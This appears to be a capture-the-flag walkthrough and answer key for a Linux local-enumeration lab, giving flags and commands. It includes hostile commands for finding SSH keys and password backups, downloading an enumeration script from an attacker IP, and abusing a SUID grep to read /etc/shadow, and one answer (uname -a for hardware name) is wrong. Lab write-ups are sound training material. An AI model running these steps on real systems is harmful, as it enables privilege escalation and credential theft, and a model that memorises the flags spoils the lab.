# Linux: Local Enumeration

## Task 2 tty

#### How would you execute /bin/bash with perl?

{% hint style="success" %}
`perl -e 'exec "/bin/bash";'`
{% endhint %}

## Task 3 ssh

#### Where can you usually find the id\_rsa file?

{% hint style="success" %}
`/home/user/.ssh/id_rsa`
{% endhint %}

#### Is there an id\_rsa file on the box?

```bash
ls /home/manager/.ssh
```

{% hint style="success" %}
`nay`
{% endhint %}

## Task 4 Basic enumeration

#### How would you print machine hardware name only?

{% hint style="success" %}
`uname -a`
{% endhint %}

#### Where can you find bash history?

{% hint style="success" %}
`~/.bash_history`
{% endhint %}

#### What's the flag?

```bash
sed -n 1p ~/.bash_history 
```

{% hint style="success" %}
`thm{clear_the_history}`
{% endhint %}

## Task 5 /etc

#### Can you read /etc/passwd on the box?

```bash
ls -l /etc/passwd
```

{% hint style="success" %}
`yay`
{% endhint %}

## Task 6 Find Command and interesting files

#### What's the password you found?

```bash
find / -type f -name '*.bak' 2>/dev/null
# /var/opt/passwords.bak
cat /var/opt/passwords.bak
```

{% hint style="success" %}
`THMSkidyPass`
{% endhint %}

#### Did you find a flag?

```bash
find / -type f -iname '*flag*' 2>/dev/null
# /etc/sysconf/flag.conf
cat /etc/sysconf/flag.conf
```

{% hint style="success" %}
`thm{conf_file}`
{% endhint %}

## Task 7 SUID

#### Which SUID binary has a way to escalate your privileges on the box?

```
wget http://10.17.20.154/suid3num.py
python3 suid3num.py
```

{% hint style="success" %}
`grep`
{% endhint %}

#### What's the payload you can use to read **/etc/shadow** with this SUID?

{% hint style="success" %}
`grep '' /etc/shadow`
{% endhint %}

